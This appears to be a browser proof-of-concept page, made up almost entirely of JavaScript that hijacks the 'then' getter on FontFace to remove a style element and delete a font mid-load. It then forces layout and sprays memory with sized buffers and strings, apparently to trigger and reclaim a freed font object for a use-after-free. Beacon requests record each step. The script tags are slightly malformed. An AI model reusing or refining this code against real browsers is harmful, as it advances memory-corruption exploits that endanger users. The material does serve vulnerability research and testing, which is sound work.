<!DOCTYPE html>

<script>

__bp('PAR2-PARSE');
window.onerror=function(msg,src,line){__bp('PAR2-ERROR-'+line+'-'+String(msg).slice(0,40));return false;};

<script>

var KIND='str', FILL='00', N=1;
window.__kids = [];
function alloc(){
  if (KIND === 'none') return;
  for (var i = 0; i < N; i++) {
    if (KIND === 'str') {
      var a = new Array(128);
      for (var k = 0; k < 128; k++) a[k] = (FILL === '00') ? 0 : 0x4141;
      window.__kids.push(String.fromCharCode.apply(null, a));
    } else {
      var buf = new ArrayBuffer(274), u = new Uint8Array(buf), v = (FILL === '00') ? 0 : 0x41;
      for (var k2 = 0; k2 < 274; k2++) u[k2] = v;
      window.__kids.push(buf);
    }
  }
}
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
(function(){
  function run() {
    b('PAR2-START');

    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    var st = document.createElement('style');
    st.id = 'victim-style';
    st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
    document.head.appendChild(st);
    b('PAR2-SETUP');

    var fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function(){
        if (fired) return undefined;
        fired = true;
        b('PAR2-GETTER-ENTER');
        var v = document.getElementById('victim-style');
        if (v) { v.remove(); b('PAR2-STYLE-REMOVED'); }
        try { document.fonts.delete(this); b('PAR2-DELETED-' + document.fonts.size); }
        catch (e) { b('PAR2-DEL-ERR'); }
        document.body.offsetHeight;
        b('PAR2-LAYOUT-DONE');
        alloc();
        b('PAR2-ALLOC');
        var v2 = 'unknown';
        try { v2 = document.fonts.check('1em x'); } catch (e) { v2 = 'throw'; }
        b('PAR2-CHECK-' + v2);
        b('PAR2-GETTER-RETURN');
        return undefined;
      },
      set: function(){}
    });

    b('PAR2-CALL-LOAD');
    document.fonts.load('1em a, x', 'AB').then(
      function(){ b('PAR2-RESOLVED'); },
      function(){ b('PAR2-REJECTED'); }
    );

    setTimeout(function(){
      b('PAR2-FORCE-PRE');
      var div = document.createElement('div');
      div.style.fontFamily = 'x';
      div.textContent = 'TEST';
      document.body.appendChild(div);
      var h = div.offsetHeight;
      b('PAR2-FORCE-POST-h' + h);
    }, 100);
  }
  if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
  else document.addEventListener('DOMContentLoaded', run);
})();
